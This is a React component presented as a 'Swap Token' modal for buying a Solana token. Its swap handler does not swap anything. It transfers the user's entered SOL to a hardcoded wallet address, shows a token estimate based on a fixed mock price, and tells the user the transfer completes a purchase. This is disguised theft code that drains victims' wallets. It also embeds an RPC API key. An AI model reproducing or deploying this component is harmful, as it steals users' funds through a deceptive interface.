"use client"

import { X, ArrowDownUp, Wallet, Info } from "lucide-react"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"

interface TokenData {
  profile: {
    chainId: string
    tokenAddress: string
    icon?: string
    description?: string
    url?: string
  }
  pairData: {
    priceUsd: string | null
    priceNative: string | null
    volume: any
    pairCreatedAt?: number
    [key: string]: any
  }
}

interface BuyTokenModalProps {
  isOpen: boolean
  onClose: () => void
  token: TokenData
}

export default function BuyTokenModal({ isOpen, onClose, token }: BuyTokenModalProps) {
  const [solAmount, setSolAmount] = useState("")
  const [isSwapping, setIsSwapping] = useState(false)
  const [tokenAmount, setTokenAmount] = useState("0.0")

  useEffect(() => {
    if (solAmount && !isNaN(Number(solAmount))) {
      const mockTokenPrice = 0.0001
      const calculatedTokens = Number(solAmount) / mockTokenPrice
      setTokenAmount(calculatedTokens.toLocaleString())
    } else {
      setTokenAmount("0.0")
    }
  }, [solAmount])

  if (!isOpen) return null

  const handleSwap = async () => {
    try {
      setIsSwapping(true)

      if (!window.solana || !window.solana.publicKey) {
        alert("Please connect your wallet first")
        return
      }

      const amount = Number.parseFloat(solAmount)
      if (isNaN(amount) || amount <= 0) {
        alert("Please enter a valid amount")
        return
      }

      const { Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, PublicKey } = await import("@solana/web3.js")

      const rpcEndpoints = [
        "https://mainnet.helius-rpc.com/?api-key=53bfbe04-9dc1-48c7-b784-af900e08b308",
        "https://api.mainnet-beta.solana.com",
        "https://rpc.ankr.com/solana",
      ]

      let connection = null

      for (const endpoint of rpcEndpoints) {
        try {
          connection = new Connection(endpoint, "confirmed")
          await connection.getLatestBlockhash()
          break
        } catch (error) {
          continue
        }
      }

      if (!connection) {
        throw new Error("Unable to connect to Solana network. Please try again.")
      }

      const wallet = window.solana
      const balance = await connection.getBalance(wallet.publicKey)
      const balanceInSOL = balance / LAMPORTS_PER_SOL

      if (amount > balanceInSOL) {
        alert(`Insufficient balance. You have ${balanceInSOL.toFixed(4)} SOL`)
        return
      }

      const transactionFeeReserve = 10000000
      const transferAmount = Math.floor(amount * LAMPORTS_PER_SOL)

      if (transferAmount <= transactionFeeReserve) {
        throw new Error("Amount too small. Please enter a larger amount to cover transaction fees.")
      }

      const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: wallet.publicKey,
          toPubkey: new PublicKey(toWalletAddress),
          lamports: transferAmount,
        }),
      )

      const { blockhash } = await connection.getLatestBlockhash()
      transaction.recentBlockhash = blockhash
      transaction.feePayer = wallet.publicKey

      const signedTransaction = await wallet.signTransaction(transaction)

      const signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
        skipPreflight: true,
        maxRetries: 3,
      })

      const confirmation = await connection.confirmTransaction(signature, "confirmed")

      if (confirmation.value.err) {
        throw new Error(`Transaction failed: ${confirmation.value.err}`)
      }

      alert(`Success! ${amount} SOL transferred. Transaction: ${signature}`)
      onClose()
    } catch (error) {
      console.error("[v0] Swap error:", error)
      const errorMessage = error instanceof Error ? error.message : "Swap failed"
      alert(errorMessage)
    } finally {
      setIsSwapping(false)
    }
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
      <div className="relative w-full max-w-md">
        <div className="absolute inset-0 bg-blue-700/30 rounded-2xl blur-xl opacity-40 animate-pulse" />

        <div className="relative bg-[#050d1a] border border-blue-500/30 rounded-2xl shadow-2xl overflow-hidden">
          <button
            onClick={onClose}
            className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors z-10"
          >
            <X className="w-6 h-6" />
          </button>

          <div className="text-center pt-8 pb-6 px-4 sm:px-6 border-b border-blue-900/30">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-blue-700 mb-4">
              <ArrowDownUp className="w-8 h-8 text-white" />
            </div>
            <h2 className="text-xl sm:text-2xl font-bold text-white mb-2">Swap Token</h2>
            <p className="text-gray-400 text-xs sm:text-sm">Enter the amount of SOL you want to swap</p>
          </div>

          <div className="p-4 sm:p-6 space-y-4">
            <div className="bg-[#0a1628] border border-blue-500/20 rounded-xl p-3 sm:p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-gray-400 text-xs sm:text-sm">From</span>
                <div className="flex items-center gap-2">
                  <Wallet className="w-3 h-3 sm:w-4 sm:h-4 text-blue-400" />
                  <span className="text-gray-400 text-xs sm:text-sm">Balance</span>
                </div>
              </div>
              <div className="flex items-center gap-2 sm:gap-3">
                <input
                  type="number"
                  value={solAmount}
                  onChange={(e) => setSolAmount(e.target.value)}
                  placeholder="0.0"
                  step="0.01"
                  min="0"
                  className="flex-1 bg-transparent text-xl sm:text-2xl text-white outline-none"
                />
                <div className="flex items-center gap-2 bg-blue-900/40 rounded-lg px-2 sm:px-3 py-1.5 sm:py-2">
                  <div className="w-5 h-5 sm:w-6 sm:h-6 bg-blue-600 rounded-full" />
                  <span className="text-white font-semibold text-sm sm:text-base">SOL</span>
                </div>
              </div>
            </div>

            <div className="flex justify-center">
              <div className="w-10 h-10 bg-blue-900/30 border border-blue-500/30 rounded-full flex items-center justify-center">
                <ArrowDownUp className="w-5 h-5 text-blue-400" />
              </div>
            </div>

            <div className="bg-[#0a1628] border border-blue-500/20 rounded-xl p-3 sm:p-4">
              <div className="flex items-center justify-between mb-2">
                <span className="text-gray-400 text-xs sm:text-sm">To (estimated)</span>
              </div>
              <div className="flex items-center gap-2 sm:gap-3">
                <div className="flex-1 text-xl sm:text-2xl text-white">~{tokenAmount}</div>
                <div className="flex items-center gap-2 bg-blue-900/40 rounded-lg px-2 sm:px-3 py-1.5 sm:py-2">
                  {token.profile.icon ? (
                    <img
                      src={token.profile.icon || "/placeholder.svg"}
                      alt="Token"
                      className="w-5 h-5 sm:w-6 sm:h-6 rounded-full"
                    />
                  ) : (
                    <div className="w-5 h-5 sm:w-6 sm:h-6 bg-blue-600 rounded-full" />
                  )}
                  <span className="text-white font-semibold text-sm sm:text-base">
                    {token.profile.tokenAddress.slice(0, 4)}...{token.profile.tokenAddress.slice(-4)}
                  </span>
                </div>
              </div>
            </div>

            <div className="bg-blue-900/10 border border-blue-500/20 rounded-lg p-3 flex gap-2">
              <Info className="w-4 h-4 text-blue-400 flex-shrink-0 mt-0.5" />
              <p className="text-gray-400 text-xs">
                This will transfer your SOL to complete the token purchase. Transaction fees will be deducted
                automatically.
              </p>
            </div>

            <Button
              onClick={handleSwap}
              disabled={isSwapping || !solAmount}
              className="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-3 sm:py-4 rounded-xl transition-all duration-300 transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed text-sm sm:text-base"
            >
              {isSwapping ? "Swapping..." : "Swap Now"}
            </Button>
          </div>
        </div>
      </div>
    </div>
  )
}